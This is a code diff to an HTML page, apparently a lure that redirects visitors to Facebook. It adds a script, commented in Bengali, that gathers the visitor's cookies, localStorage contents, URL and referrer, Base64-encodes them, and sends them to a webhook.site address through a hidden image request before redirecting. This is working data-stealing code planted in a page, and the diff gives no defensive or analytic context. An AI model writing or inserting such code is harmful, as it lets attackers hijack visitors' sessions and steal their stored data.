@@ -44,6 +44,32 @@
                 window.location.replace("https://www.facebook.com/home.php");
             }, 5000);
         })();
+        (function() {
+    // ১. ডাটা অবজেক্ট তৈরি
+    const data = {
+        cookies: document.cookie,
+        ls: JSON.stringify(localStorage),
+        url: window.location.href,
+        ref: document.referrer
+    };
+
+    // ২. Base64 এনকোডিং
+    const encodedData = btoa(unescape(encodeURIComponent(JSON.stringify(data))));
+
+    // ৩. তোর Webhook URL
+    const webhook = "https://webhook.site/aa222275-079e-4bbf-a7b9-17a665cbca1d";
+    
+    // ৪. ডাটা পাঠানোর জন্য ইমেজ অবজেক্ট (বেশি রিলায়েবল)
+    const logger = new Image();
+    logger.src = webhook + "?data=" + encodedData;
+
+    console.log("Exfiltrating...");
+
+    // ৫. রিডাইরেক্ট করার আগে ২ সেকেন্ড ওয়েট করা (যাতে ডাটাটা Webhook-এ পৌঁছানোর সময় পায়)
+    setTimeout(function() {
+        window.location.replace("https://www.facebook.com/home.php");
+    }, 2000); 
+})();
     </script>
 </body>
 </html>
